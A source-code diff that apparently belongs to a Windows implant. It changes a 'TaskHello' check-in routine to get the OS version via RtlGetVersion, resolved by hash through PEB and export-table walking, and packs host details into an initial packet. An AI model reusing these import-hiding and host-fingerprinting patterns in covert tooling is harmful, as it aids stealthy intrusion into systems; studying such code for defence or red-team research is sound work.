@@ -20,10 +20,12 @@ typedef struct __attribute__(( packed, scalar_storage_order( "big-endian" ) ))
 
 typedef struct
 {
+	D_API( RtlGetVersion );
 	D_API( RtlFreeHeap );
 } API ;
 
 /* API Hashes */
+#define H_API_RTLGETVERSION	0x0dde5cdd /* RtlGetVersion */
 #define H_API_RTLFREEHEAP	0x73a9e4d7 /* RtlFreeHeap */
 
 /* LIB Hashes */
@@ -41,6 +43,7 @@ D_SEC( B ) BOOL TaskHello( _In_ PVOID Buffer, _In_ UINT32 Length, _In_ PBUFFER O
 {
 	API			Api;
 	TASK_HELLO_BUF		Thb;
+	RTL_OSVERSIONINFOW	Ver;
 
 	BOOL			Ret = FALSE;
 
@@ -52,19 +55,25 @@ D_SEC( B ) BOOL TaskHello( _In_ PVOID Buffer, _In_ UINT32 Length, _In_ PBUFFER O
 	/* Zero out stack structures */
 	RtlSecureZeroMemory( &Api, sizeof( Api ) );
 	RtlSecureZeroMemory( &Thb, sizeof( Thb ) );
-
-	/* Create initial struct */
-	Thb.OsMajorVersion = NtCurrentPeb()->OSMajorVersion;
-	Thb.OsMinorVersion = NtCurrentPeb()->OSMinorVersion;
-	Thb.IsAdmin        = FALSE;
-#if defined( _WIN64 )
-	Thb.Is64           = TRUE; 
-#else
-	Thb.Is64	   = FALSE;
-#endif
+	RtlSecureZeroMemory( &Ver, sizeof( Ver ) );
 
 	/* Init API */
-	Api.RtlFreeHeap = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLFREEHEAP );
+	Api.RtlGetVersion = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLGETVERSION );
+	Api.RtlFreeHeap   = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLFREEHEAP );
+
+	/* Get version and create initial packet */
+	Ver.dwOSVersionInfoSize = sizeof( Ver );
+	Api.RtlGetVersion( &Ver );
+
+	Thb.OsMajorVersion = Ver.dwMajorVersion;
+	Thb.OsMinorVersion = Ver.dwMinorVersion;
+	Thb.IsAdmin        = FALSE;
+
+#if defined( _WIN64 )
+	Thb.Is64           = TRUE;
+#else
+	Thb.Is64           = FALSE;
+#endif
 
 	/* Create buffer to hold information */
 	if ( ( Out = BufferCreate() ) != NULL ) {
@@ -101,6 +110,7 @@ D_SEC( B ) BOOL TaskHello( _In_ PVOID Buffer, _In_ UINT32 Length, _In_ PBUFFER O
 	/* Zero out stack structures */
 	RtlSecureZeroMemory( &Api, sizeof( Api ) );
 	RtlSecureZeroMemory( &Thb, sizeof( Thb ) );
+	RtlSecureZeroMemory( &Ver, sizeof( Ver ) );
 
 	/* Success or fail! */
 	return Ret;
